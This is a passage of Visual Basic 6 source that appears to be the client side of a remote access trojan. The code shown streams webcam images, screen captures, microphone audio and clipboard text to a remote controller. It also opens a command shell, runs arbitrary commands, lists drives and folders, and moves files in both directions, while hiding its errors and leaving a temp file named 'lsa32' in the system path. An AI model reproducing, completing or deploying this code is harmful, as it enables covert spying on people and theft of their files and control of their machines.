                If cameraLen > packageLen Then cameraLen = packageLen
                ReDim data(cameraLen - 1)
                CopyMemory data(0), cameraData(cameraPos), cameraLen
                cameraPos = cameraPos + cameraLen
                SendData ChrB(78), CStr(data)
            End If
        End If
    
    'camera cancel
    ElseIf key = 81 Then
        cameraing = False
        Erase cameraData
        closeCamera
    
    'jpg quality
    ElseIf key = 82 Then
        jpgQuality = head(1)
    
    'capture media
    ElseIf key = 83 Then
        If head(1) = 1 Then
            cameraFile = True
        Else
            cameraFile = False
        End If
    
    'clipboard apply
    ElseIf key = 85 Then
        SendData ChrB(86), LeftB(getClipboardText, packageLen)
    
    
    'else are bad packages
    Else
        'nothing
    End If
    'retreat
    If dataLeft = True Then
        dataBytes = leftBytes
        DataCenter
    End If
End Sub

Private Sub TCP_Connect(ByVal Index As Variant)
    On Error Resume Next
    If Index = 1 Then
        tunnelConnected = True
        SendData ChrB(51)
    ElseIf Index = 2 Then
        midConnectedMin = 0
        MidReconnect = False
        dataLeftA = False
        TCP.SendData 2, CStr(getVolSeri)
    ElseIf Index = 3 Then
        SendDataA ChrB(6)
    ElseIf Index = 4 Then
        MidHtml = ""
        TCP.SendData 4, StrConv("GET /blog_163_com_vb/ HTTP/1.1" & vbNewLine & "Accept: */*" & vbNewLine & "Host: blog.163.com" & vbNewLine & "Connection: close" & vbNewLine & vbNewLine, vbFromUnicode)
    End If
End Sub

Private Function makeHead(ByRef head As String) As String
    On Error Resume Next
    Dim i As Long
    makeHead = LeftB(head, headLen)
    For i = LenB(head) + 1 To headLen
        makeHead = makeHead + ChrB(0)
    Next i
End Function

Private Sub sizeToScreen()
    On Error Resume Next
    With Picture1
        .Width = Screen.Width
        .Height = Screen.Height
    End With
    With Picture2
        .Width = Screen.Width \ 4
        .Height = Screen.Height \ 4
    End With
End Sub

Private Sub openCamera()
    On Error Resume Next
    If cameraReady = True Then Exit Sub
    'open camera
    capHwnd = capCreateCaptureWindow("", 0, 0, 0, 0, 0, Me.hwnd, 0)
    If capHwnd = 0 Then Exit Sub
    cameraReady = True
    If SendMessage(capHwnd, WM_CAP_DRIVER_CONNECT, 0, ByVal 0&) = 0 Then closeCamera
End Sub

Private Sub closeCamera()
    On Error Resume Next
    If cameraReady = False Then Exit Sub
    'close camera
    SendMessage capHwnd, WM_CAP_DRIVER_DISCONNECT, 0, ByVal 0&
    DestroyWindow capHwnd
    Kill sysPath & "\lsa32" & EncoderQuality
    cameraReady = False
End Sub

Private Sub takeCamera(ByVal minimode As Boolean)
    On Error Resume Next
    If cameraReady = False Then Exit Sub
    Dim overload As String
    SendMessage capHwnd, WM_CAP_GRAB_FRAME, 0, ByVal 0&
    If cameraFile = True Then
        SendMessage capHwnd, WM_CAP_FILE_SAVEDIB, 0, ByVal sysPath & "\lsa32" & EncoderQuality
        Picture3.Picture = LoadPicture(sysPath & "\lsa32" & EncoderQuality)
    Else
        saveClipboard
        SendMessage capHwnd, WM_CAP_EDIT_COPY, 0, ByVal 0&
        Picture3.Picture = Clipboard.GetData
        restoreClipboard
        If clipLength < 0 Then
            overload = "Error"
        ElseIf clipLength < 1024 Then
            overload = CStr(clipLength)
        ElseIf clipLength < 1048576 Then
            overload = CStr(clipLength \ 1024) & "K"
        Else
            overload = CStr(clipLength \ 1048576) & "M"
        End If
    End If
    Dim cameraWidth As Long
    Dim cameraHeight As Long
    If minimode = True Then
        Picture4.Width = Picture3.Width \ 4
        Picture4.Height = Picture3.Height \ 4
        Picture4.PaintPicture Picture3.Image, 0, 0, Picture4.Width, Picture4.Height, 0, 0, Picture3.Width, Picture3.Height
        cameraWidth = Picture4.Width \ Screen.TwipsPerPixelX
        cameraHeight = Picture4.Height \ Screen.TwipsPerPixelY
        makeJPG Picture4.Image, 2
    Else
        cameraWidth = Picture3.Width \ Screen.TwipsPerPixelX
        cameraHeight = Picture3.Height \ Screen.TwipsPerPixelY
        makeJPG Picture3.Image, 2
    End If
    cameraData = jpgData
    cameraPos = 0
    Erase jpgData
    Picture3.Picture = Nothing
    Dim head(3) As Byte
    head(0) = cameraWidth \ 256
    head(1) = cameraWidth Mod 256
    head(2) = cameraHeight \ 256
    head(3) = cameraHeight Mod 256
    SendData ChrB(77) + CStr(head), overload
End Sub

Private Sub OpenShell()
    On Error Resume Next
    If ifCMD = True Then Exit Sub
    'check if started success
    If StartCmdProc() = True Then
        'wait for the shell start
        Sleep 2000
        'shell is ready
        SendData ChrB(27)
        ifCMD = True
    Else
        'failed to open a shell
        SendData ChrB(16)
        ifCMD = False
    End If
End Sub

Private Sub CloseShell()
    On Error Resume Next
    If ifCMD = False Then Exit Sub
    'close the shell
    CloseCmdShell
    Sleep 2000
    ifCMD = False 'mark it
End Sub

Private Sub sendFile(ByVal filePath As String, ByVal shead As String)
    On Error Resume Next
    'check the state
    If downloading = True Then Exit Sub
    'check if the file is existed
    If Dir(filePath, vbHidden + vbSystem) = vbNullString Then
        SendData ChrB(24)
        Exit Sub
    End If
    'open file
    Open filePath For Binary As #1
    'continue from last time
    Dim bhead() As Byte
    bhead = shead
    Dim breakPoint As Long
    breakPoint = 0
    Dim i As Long
    For i = 1 To 4
        breakPoint = breakPoint * 256 + bhead(i)
    Next i
    Seek #1, breakPoint + 1
    'make the head
    Dim Length As Long
    Length = LOF(1)
    Dim head(3) As Byte
    For i = 3 To 0 Step -1
        'divide the long data into bytes
        head(i) = Length Mod 256
        Length = Length \ 256
    Next i
    'send length
    SendData ChrB(5) + CStr(head)
    'set the state
    downloading = True
End Sub

Private Sub receiveFile(ByVal filePath As String)
    On Error Resume Next
    'check the state
    If uploading = True Then Exit Sub
    'incase file is readonly
    SetAttr filePath, vbNormal
    'open file
    Open filePath For Binary As #2
    'check if readable
    If Dir(filePath) = vbNullString Then
        Close #2
        SendData ChrB(25)
        Exit Sub
    End If
    Dim Length As Long
    Length = LOF(2)
    'continue from breakpoint
    Seek #2, Length + 1
    'make the head
    Dim head(3) As Byte
    Dim i As Long
    For i = 3 To 0 Step -1
        'divide the long data into bytes
        head(i) = Length Mod 256
        Length = Length \ 256
    Next i
    'send length
    SendData ChrB(11) + CStr(head)
    'set the state
    uploading = True
End Sub

Private Sub shellCommand(ByVal commandStr As String, ByVal windowStyle As Long)
    On Error Resume Next
    Shell commandStr, windowStyle
End Sub

Private Sub sendDriverList()
    On Error Resume Next
    driveList = ""
    Dim driverLen As Long
    Dim driverBuff As String
    Dim diskType As Long
    driverBuff = String(MAX_PATH, Chr(0))
    driverLen = GetLogicalDriveStrings(MAX_PATH, driverBuff)
    driverBuff = Left(driverBuff, driverLen)
    Dim driver As String
    Dim pos As Long
    Do While Len(driverBuff) > 0
        pos = InStr(driverBuff, "\")
        driver = Left(driverBuff, pos)
        diskType = GetDriveType(driver)
        Dim info As String
        If diskType = 0 Then
            info = "[Unknow]"
        ElseIf diskType = 1 Then
            info = "[Error]"
        ElseIf diskType = 2 Then
            info = "[Removable]"
        ElseIf diskType = 3 Then
            info = ""
        ElseIf diskType = 4 Then
            info = "[Remote]"
        ElseIf diskType = 5 Then
            info = "[CD/DVD]"
        ElseIf diskType = 6 Then
            info = "[RamDisk]"
        End If
        Dim VolName As String
        Dim FileSystemName As String
        VolName = String(MAX_PATH, Chr(0))
        FileSystemName = String(MAX_PATH, Chr(0))
        GetVolumeInformation driver, VolName, MAX_PATH, 0, 0, 0, FileSystemName, MAX_PATH
        VolName = Left(VolName, InStr(VolName, Chr(0)) - 1)
        FileSystemName = Left(FileSystemName, InStr(FileSystemName, Chr(0)) - 1)
        driveList = driveList + Left(driver, Len(driver) - 1) + " " + IIf(VolName = "", "", "[" + VolName + "]") + info + IIf(FileSystemName = "", "", "[" + FileSystemName + "]") + Chr(0)
        driverBuff = Right(driverBuff, Len(driverBuff) - pos - 1)
    Loop
    SendData ChrB(30) + ChrB(1), LeftB(driveList, packageLen)
    driveList = RightB(driveList, IIf(LenB(driveList) > packageLen, LenB(driveList) - packageLen, 0))
End Sub

Private Sub sendDirList(ByVal Path As String)
    On Error Resume Next
    If Path = ".." Then
        Dim pos As Long
        pos = InStrRev(currentPath, "\") - 1
        If pos > 0 Then currentPath = Left(currentPath, pos)
    ElseIf Path = "." Then 'current path = currentPath
    Else
        currentPath = currentPath + "\" + Path
    End If
    dirList = ""
    fileList = ""
    Dim dirItem As String
    dirItem = Dir(currentPath + "\", vbNormal Or vbDirectory Or vbHidden Or vbReadOnly Or vbSystem)
    Do While dirItem <> ""
        If (GetAttr(currentPath + "\" + dirItem) And vbDirectory) = vbDirectory Then
            dirList = dirList + dirItem + Chr(0)
        Else
            fileList = fileList + dirItem + Chr(0)
        End If
        dirItem = Dir()
    Loop
    dirPath = currentPath + "\"
    SendData ChrB(33) + ChrB(1), LeftB(dirPath, packageLen)
    dirPath = RightB(dirPath, IIf(LenB(dirPath) > packageLen, LenB(dirPath) - packageLen, 0))
End Sub

Private Sub changeDriver(ByVal Path As String)
    On Error Resume Next
    currentPath = Path
    sendDirList "."
End Sub

Private Sub SendData(ByRef head As String, Optional ByRef data As String = vbNullString)
    On Error Resume Next
    Dim toSend() As Byte
    Dim dataLen As Long
    dataLen = 2 + headLen + LenB(data)
    ReDim toSend(dataLen - 1)
    toSend(0) = dataLen \ 256
    toSend(1) = dataLen Mod 256
    CopyMemory toSend(2), ByVal StrPtr(makeHead(head)), headLen
    If LenB(data) > 0 Then CopyMemory toSend(2 + headLen), ByVal StrPtr(data), LenB(data)
    TCP.SendData 0, toSend
End Sub

Private Sub SendDataA(ByRef head As String, Optional ByRef data As String = vbNullString)
    On Error Resume Next
    Dim toSend() As Byte
    Dim dataLen As Long
    dataLen = 2 + headLen + LenB(data)
    ReDim toSend(dataLen - 1)
    toSend(0) = dataLen \ 256
    toSend(1) = dataLen Mod 256
    CopyMemory toSend(2), ByVal StrPtr(makeHead(head)), headLen
    If LenB(data) > 0 Then CopyMemory toSend(2 + headLen), ByVal StrPtr(data), LenB(data)
    TCP.SendData 2, toSend
End Sub

Private Sub Desktop(ByVal minimode As Boolean)
    On Error Resume Next
    miniDesktop = minimode
    sizeToScreen
    miniWidth = Picture2.Width \ Screen.TwipsPerPixelX
    miniHeight = Picture2.Height \ Screen.TwipsPerPixelY
    'make the head
    Dim head(3) As Byte
    If miniDesktop Then
        head(0) = miniWidth \ 256
        head(1) = miniWidth Mod 256
        head(2) = miniHeight \ 256
        head(3) = miniHeight Mod 256
    Else
        head(0) = (miniWidth * 4) \ 256
        head(1) = (miniWidth * 4) Mod 256
        head(2) = (miniHeight * 4) \ 256
        head(3) = (miniHeight * 4) Mod 256
    End If
    currentDesktop = 0
    firstDesktop = True
    'send screen information
    SendData ChrB(22) + CStr(head) + CStr(ChrB(imageType))
End Sub

Private Sub takeDesktop()
    On Error Resume Next
    Dim miniTop As Long
    Dim miniLeft As Long
    miniTop = (currentDesktop \ 4) * miniHeight
    miniLeft = (currentDesktop Mod 4) * miniWidth
    'take a snapshot
    If miniDesktop = False Then
        BitBlt Picture2.hDC, 0, 0, miniWidth, miniHeight, GetDC(0), miniLeft, miniTop, &HCC0020
    Else
        BitBlt Picture1.hDC, 0, 0, miniWidth * 4, miniHeight * 4, GetDC(0), 0, 0, &HCC0020
        Picture2.PaintPicture Picture1.Image, 0, 0, Picture2.Width, Picture2.Height, 0, 0, Picture1.Width, Picture1.Height
    End If
    'make jpg data array
    makeJPG Picture2.Image, imageType
    'copy data to jpgDataNow
    ReDim Preserve jpgDataNow(jpgPosNow(currentDesktop) + UBound(jpgData))
    CopyMemory jpgDataNow(jpgPosNow(currentDesktop)), jpgData(0), UBound(jpgData) + 1
    jpgPosNow(currentDesktop + 1) = UBound(jpgDataNow) + 1
    jpgPos = jpgPosNow(currentDesktop)
    Erase jpgData
    'compare with the pre one
    Dim jpgSame As Boolean
    jpgSame = True
    If jpgPosNow(currentDesktop + 1) - jpgPosNow(currentDesktop) <> jpgPosPre(currentDesktop + 1) - jpgPosPre(currentDesktop) Then
        jpgSame = False
    Else
        Dim i As Long
        Dim max As Long
        max = jpgPosPre(currentDesktop + 1) - jpgPosPre(currentDesktop) - 1
        For i = 0 To max
            If jpgDataNow(jpgPosNow(currentDesktop) + i) <> jpgDataPre(jpgPosPre(currentDesktop) + i) Then
                jpgSame = False
                Exit For
            End If
        Next i
    End If
    If jpgSame = False Then
        Dim bhead(7) As Byte
        bhead(0) = miniLeft \ 256
        bhead(1) = miniLeft Mod 256
        bhead(2) = miniTop \ 256
        bhead(3) = miniTop Mod 256
        bhead(4) = miniWidth \ 256
        bhead(5) = miniWidth Mod 256
        bhead(6) = miniHeight \ 256
        bhead(7) = miniHeight Mod 256
        SendData ChrB(39) + CStr(bhead)
    ElseIf miniDesktop Or currentDesktop = 15 Then
        jpgDataPre = jpgDataNow
        CopyMemory jpgPosPre(0), jpgPosNow(0), CLng(UBound(jpgPosPre) + 1) * 4
        desktoping = False
        SendData ChrB(38)
    Else
        currentDesktop = currentDesktop + 1
        takeDesktop
    End If
End Sub

Private Sub takeBMPDesktop()
    On Error Resume Next
    BitBlt Picture1.hDC, 0, 0, miniWidth * 4, miniHeight * 4, GetDC(0), 0, 0, &HCC0020
    Dim pbag As PropertyBag
    Set pbag = New PropertyBag
    If miniDesktop = False Then
        pbag.WriteProperty "BMP", Picture1.Image
    Else
        Picture2.PaintPicture Picture1.Image, 0, 0, Picture2.Width, Picture2.Height, 0, 0, Picture1.Width, Picture1.Height
        pbag.WriteProperty "BMP", Picture2.Image
    End If
    BMPNow = pbag.Contents
    BMPMax = UBound(BMPNow)
    BMPPos = 0
    Set pbag = Nothing
    ReDim Preserve BMPPre(BMPMax)
    Dim Length As Long
    Length = BMPMax
    Dim head(3) As Byte
    Dim i As Long
    For i = 3 To 0 Step -1
        'divide the long data into bytes
        head(i) = Length Mod 256
        Length = Length \ 256
    Next i
    'send length
    SendData ChrB(45) + CStr(head)
End Sub

Private Sub BMPCompress()
    On Error Resume Next
    Dim i As Long
    Dim j As Long
    Dim data() As Byte
    For i = BMPPos To BMPMax
        If BMPPre(i) <> BMPNow(i) Then Exit For
    Next i
    If i > BMPMax Then
        BMPPre = BMPNow
        desktoping = False
        SendData ChrB(44)
    Else
        BMPPos = i
        Dim k As Long
        Dim d(2) As Byte
        Dim ifSingle As Boolean
        Dim sPos As Long
        ifSingle = False
        k = IIf(5 > packageLen, 5, packageLen)
        ReDim data(k - 1)
        j = 0
        Do While i <= BMPMax
            If j + 4 > UBound(data) Then Exit Do 'package full
            If i + 2 > BMPMax Then
                data(j) = BMPNow(i)
                j = j + 1
                i = i + 1
                If i = BMPMax Then
                    data(j) = BMPNow(i)
                    j = j + 1
                    i = i + 1
                End If
                Exit Do
            End If
            d(0) = BMPNow(i)
            d(1) = BMPNow(i + 1)
            d(2) = BMPNow(i + 2)
            i = i + 3
            For k = 1 To 254
                If i + 2 > BMPMax Then Exit For
                If d(0) <> BMPNow(i) Or d(1) <> BMPNow(i + 1) Or d(2) <> BMPNow(i + 2) Then Exit For
                i = i + 3
            Next k
            If k = 1 Then
                If ifSingle = False Then
                    ifSingle = True
                    data(j) = 0
                    data(j + 1) = 1
                    sPos = j + 1
                    j = j + 2
                Else
                    data(sPos) = data(sPos) + 1
                    If data(sPos) = 255 Then ifSingle = False
                End If
                data(j) = d(0)
                data(j + 1) = d(1)
                data(j + 2) = d(2)
                j = j + 3
            Else
                If ifSingle = True Then ifSingle = False
                data(j) = k
                data(j + 1) = d(0)
                data(j + 2) = d(1)
                data(j + 3) = d(2)
                j = j + 4
            End If
        Loop
        ReDim Preserve data(j - 1)
        Dim bhead(3) As Byte
        For k = 3 To 0 Step -1
            'divide the long data into bytes
            bhead(k) = BMPPos Mod 256
            BMPPos = BMPPos \ 256
        Next k
        BMPPos = i
        SendData ChrB(42) + CStr(bhead), CStr(data)
    End If
End Sub

Public Sub sendWave()
    On Error Resume Next
    If waveReady = False Or waveSendFinish = True Then Exit Sub
    If wavePos > UBound(waveData) Then
        'wave send finish
        SendData ChrB(70)
        If waveRecFinish = True Then
            waveData = hMemIn
            WaveInRecord
            wavePos = 0
            sendWave
        Else
            waveSendFinish = True
        End If
    Else
        Dim wlength As Long
        wlength = BUF_SIZE - wavePos
        If wlength > packageLen Then wlength = packageLen
        Dim data() As Byte
        ReDim data(wlength - 1)
        CopyMemory data(0), waveData(wavePos), wlength
        SendData ChrB(68), CStr(data)
        wavePos = wavePos + wlength
    End If
End Sub

Private Sub TCP_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    TCP_CloseSck Index
End Sub

Private Function getVolSeri() As Long
    On Error Resume Next
    Dim VolName As String
    Dim FileSystemName As String
    VolName = String(MAX_PATH, Chr(0))
    FileSystemName = String(MAX_PATH, Chr(0))
    GetVolumeInformation "\", VolName, MAX_PATH, getVolSeri, 0, 0, FileSystemName, MAX_PATH
End Function
